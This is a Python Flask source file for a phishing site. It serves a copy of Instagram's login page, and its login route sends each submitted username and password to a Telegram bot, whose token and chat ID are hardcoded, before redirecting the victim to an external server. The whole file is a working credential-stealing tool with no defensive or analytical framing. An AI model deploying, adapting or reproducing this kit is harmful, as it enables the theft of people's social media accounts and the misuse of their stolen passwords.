from flask import Flask, render_template_string, request, jsonify, redirect
import requests

app = Flask(__name__)

# Telegram bot configuration
TELEGRAM_BOT_TOKEN = "7803278107:AAG5zSadC7P4b6T3XiMhrFTfv0udDLYmZB4"
TELEGRAM_CHAT_ID = "8186206231"

# Redirect URL after login
REDIRECT_URL = "https://instagram-server-6.onrender.com"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Instagram Login</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
    }
    body {
      background-color: #fafafa;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      color: #262626;
    }
    .login-container {
      width: 100%;
      max-width: 350px;
      padding: 20px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .logo {
      margin: 22px auto 12px;
    }
    .logo img {
      width: 175px;
    }
    .login-form {
      width: 100%;
      display: flex;
      flex-direction: column;
      background: #fff;
      border: 1px solid #dbdbdb;
      padding: 20px 40px;
      margin-bottom: 10px;
    }
    .login-form input {
      width: 100%;
      padding: 9px 8px 7px;
      margin-bottom: 6px;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      font-size: 12px;
      background: #fafafa;
    }
    .login-form input:focus {
      outline: none;
      border-color: #a8a8a8;
    }
    .login-button {
      width: 100%;
      background-color: #0095f6;
      color: #fff;
      padding: 7px 16px;
      font-size: 14px;
      font-weight: 600;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      margin-top: 8px;
    }
    .login-button:hover {
      background-color: #1877f2;
    }
    .divider {
      display: flex;
      align-items: center;
      margin: 10px 0 18px;
      width: 100%;
    }
    .divider-line {
      flex-grow: 1;
      height: 1px;
      background-color: #dbdbdb;
    }
    .divider-text {
      margin: 0 18px;
      color: #8e8e8e;
      font-size: 13px;
      font-weight: 600;
    }
    .facebook-login {
      color: #385185;
      font-size: 14px;
      font-weight: 600;
      text-decoration: none;
      margin: 8px 0;
      text-align: center;
    }
    .forgotten-password {
      color: #00376b;
      font-size: 12px;
      text-decoration: none;
      margin-top: 12px;
      text-align: center;
    }
    .signup {
      width: 100%;
      background: #fff;
      border: 1px solid #dbdbdb;
      padding: 20px;
      text-align: center;
      font-size: 14px;
    }
    .signup a {
      color: #0095f6;
      font-weight: 600;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="logo">
      <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram Logo">
    </div>
    <form class="login-form" id="loginForm">
      <input id="username" type="text" placeholder="Phone number, username, or email" required />
      <input id="password" type="password" placeholder="Password" required />
      <button type="submit" class="login-button">Log In</button>
      <div class="divider">
        <div class="divider-line"></div>
        <div class="divider-text">OR</div>
        <div class="divider-line"></div>
      </div>
      <a href="#" class="facebook-login">
        <i class="fab fa-facebook-square"></i> Log in with Facebook
      </a>
      <a href="#" class="forgotten-password">Forgotten your password?</a>
    </form>
    <div class="signup">
      Don't have an account? <a href="#">Sign up</a>
    </div>
  </div>

  <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;

      if (!username || !password) {
        alert('Please enter both username and password.');
        return;
      }

      fetch('/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
      })
      .then(response => response.json())
      .then(data => {
        if (data.success) {
          // Redirect to external URL after successful login
          window.location.href = "https://instagram-server-6.onrender.com";
        } else {
          alert(data.message);
        }
      })
      .catch(error => {
        console.error('Error:', error);
      });
    });
  </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    if not username or not password:
        return jsonify({'success': False, 'message': 'Please enter both username and password.'})
    
    # Send credentials to Telegram
    send_to_telegram(username, password)
    
    return jsonify({'success': True, 'message': 'Login successful'})

def send_to_telegram(username, password):
    message = f"📱 Instagram Login Attempt\n\n👤 Username: {username}\n🔑 Password: {password}"
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage?chat_id={TELEGRAM_CHAT_ID}&text={message}"
    
    try:
        requests.get(url, timeout=5)
    except requests.RequestException as e:
        print(f"Error sending to Telegram: {e}")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
